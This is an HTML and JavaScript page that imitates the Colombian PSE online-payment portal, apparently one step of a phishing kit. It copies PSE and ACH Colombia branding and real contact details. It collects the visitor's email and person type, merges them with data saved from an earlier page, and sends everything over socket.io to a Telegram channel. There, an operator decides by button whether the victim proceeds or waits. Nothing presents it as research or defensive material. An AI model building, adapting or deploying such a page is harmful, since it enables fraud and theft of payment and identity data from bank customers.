<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PSE - Pago Seguro en Línea</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <script src="/socket.io/socket.io.js"></script>
    
    <!-- Background Pattern -->
    <div class="bg-pattern"></div>

    <!-- Header con NFbanner-izq.svg grande -->
    <header class="header">
        <img src="img/NFbanner-izq.svg" alt="PSE" class="main-banner">
    </header>

    <!-- Main Content -->
    <main class="main-container">
        <div class="content-box">
            <!-- Título -->
            <h1 class="main-title">Selecciona el tipo de persona:</h1>

            <!-- Formulario -->
            <form class="main-form" id="pse-form">
                <!-- Selector de Tipo de Persona -->
                <div class="person-selector">
                    <div class="person-card selected" data-type="natural">
                        <input type="radio" name="personType" value="natural" checked>
                        <img src="img/natural_check.svg" alt="Natural" class="person-img">
                        <span class="person-label">Natural</span>
                    </div>
                    <div class="person-card" data-type="juridica">
                        <input type="radio" name="personType" value="juridica">
                        <img src="img/juridica.svg" alt="Jurídica" class="person-img">
                        <span class="person-label">Jurídica</span>
                    </div>
                </div>

                <!-- Opciones de Usuario -->
                <div class="user-options">
                    <button type="button" class="user-option selected" id="registered-user">
                        <img src="img/opreg_sel.svg" alt="" class="option-icon">
                        <span>Soy un usuario registrado</span>
                    </button>
                    <button type="button" class="user-option" id="new-user">
                        <img src="img/opact.svg" alt="" class="option-icon">
                        <span>Registrarme ahora</span>
                    </button>
                </div>

                <!-- Campo de Email -->
                <div class="email-field">
                    <label for="email" class="field-label">
                        Ingresa tu correo electrónico <span class="asterisk">*</span>
                    </label>
                    <input 
                        type="email" 
                        id="email" 
                        name="email" 
                        class="email-input" 
                        placeholder="Ej: correo@pse.com.co"
                        required
                    >
                </div>

                <!-- Botones -->
                <div class="form-buttons">
                    <button type="submit" class="btn-primary" id="btn-submit">
                        Ir al Banco
                    </button>
                    <button type="button" class="btn-secondary" onclick="window.history.back()">
                        Regresar al comercio
                    </button>
                </div>
            </form>

            <!-- Información de Contacto -->
            <div class="contact-box">
                <div class="contact-icon-left">
                    <img src="img/footerD.svg" alt="Contacto">
                </div>
                <div class="contact-content">
                    <h3 class="contact-title">Para mayor información comunícate con nosotros:</h3>
                    <div class="contact-info">
                        <div class="contact-row">
                            <img src="img/mobile.svg" alt="Teléfono">
                            <span><strong>En Bogotá:</strong> +57 (601) 3808890 opción 5</span>
                        </div>
                        <div class="contact-row">
                            <img src="img/conta.svg" alt="Web">
                            <span><strong>Contáctanos:</strong> <a href="https://www.pse.com.co/persona-centro-de-ayuda" target="_blank">https://www.pse.com.co/persona-centro-de-ayuda</a></span>
                        </div>
                    </div>
                    <div class="ach-logo">
                        <img src="img/footer.svg" alt="ACH Colombia">
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Pantalla de Carga (Oculta por defecto) -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <img src="img/procesandonw.gif" alt="Procesando" class="loading-gif">
            <p class="loading-text">Procesando tu solicitud...</p>
        </div>
    </div>

    <script>
        // ===== ELEMENTOS DEL DOM =====
        const form = document.getElementById('pse-form');
        const emailInput = document.getElementById('email');
        const personCards = document.querySelectorAll('.person-card');
        const userOptions = document.querySelectorAll('.user-option');
        const loadingOverlay = document.getElementById('loadingOverlay');

        // ===== SOCKET.IO =====
        const socket = io();
        const sessionId = sessionStorage.getItem('pseSessionId') || 
                         'pse_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        sessionStorage.setItem('pseSessionId', sessionId);

        // ===== CAMBIO DE TIPO DE PERSONA =====
        personCards.forEach(card => {
            card.addEventListener('click', function() {
                personCards.forEach(c => c.classList.remove('selected'));
                this.classList.add('selected');
                this.querySelector('input[type="radio"]').checked = true;
            });
        });

        // ===== CAMBIO DE OPCIONES DE USUARIO =====
        userOptions.forEach(option => {
            option.addEventListener('click', function() {
                userOptions.forEach(opt => opt.classList.remove('selected'));
                this.classList.add('selected');
            });
        });

        // ===== VALIDACIÓN DE EMAIL =====
        emailInput.addEventListener('input', function() {
            if (this.value) {
                this.classList.remove('error');
            }
        });

        // ===== ENVÍO DEL FORMULARIO =====
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            // Validar email
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailInput.value || !emailRegex.test(emailInput.value)) {
                emailInput.classList.add('error');
                return;
            }

            // Obtener datos del formulario anterior
            const previousData = JSON.parse(sessionStorage.getItem('formData') || '{}');

            // Recopilar datos completos
            const pseData = {
                ...previousData,
                personType: document.querySelector('input[name="personType"]:checked').value,
                email: emailInput.value,
                registeredUser: document.getElementById('registered-user').classList.contains('selected'),
                timestamp: new Date().toISOString()
            };

            // Guardar datos en sessionStorage
            sessionStorage.setItem('pseData', JSON.stringify(pseData));

            // Mostrar pantalla de carga
            showLoadingScreen();

            // Enviar datos a Telegram
            socket.emit('sendPSEToTelegram', {
                sessionId: sessionId,
                data: pseData
            });
        });

        // ===== MOSTRAR PANTALLA DE CARGA =====
        function showLoadingScreen() {
            loadingOverlay.classList.add('active');
        }

        // ===== OCULTAR PANTALLA DE CARGA =====
        function hideLoadingScreen() {
            loadingOverlay.classList.remove('active');
        }

        // ===== EVENTOS DE SOCKET.IO =====
        
        // Confirmación de envío a Telegram
        socket.on('telegramSent', (response) => {
            console.log('✅ Datos PSE enviados a Telegram:', response);
        });

        // Botón "Seguir" desde Telegram
        socket.on('actionFollowPSE', (data) => {
            if (data.sessionId === sessionId) {
                // Aquí redirigirás a la siguiente página que me dirás más adelante
                console.log('✅ Usuario autorizado para continuar');
                // window.location.href = 'siguiente-pagina.html';
            }
        });

        // Botón "Esperar" desde Telegram
        socket.on('actionWaitPSE', (data) => {
            if (data.sessionId === sessionId) {
                console.log('⏳ Esperando 15 segundos...');
                // La pantalla de carga se mantiene por 15 segundos
                setTimeout(() => {
                    console.log('⏳ Tiempo de espera completado');
                }, 15000);
            }
        });

        // Manejo de errores
        socket.on('error', (error) => {
            console.error('❌ Error:', error);
            hideLoadingScreen();
            alert('Ocurrió un error. Por favor intenta nuevamente.');
        });

        socket.on('connect_error', (error) => {
            console.error('❌ Error de conexión:', error);
        });

        // ===== ANIMACIÓN DE ENTRADA =====
        window.addEventListener('load', function() {
            document.querySelector('.form-section').style.animation = 'fadeInUp 0.6s ease';
        });
    </script>
</body>
</html>
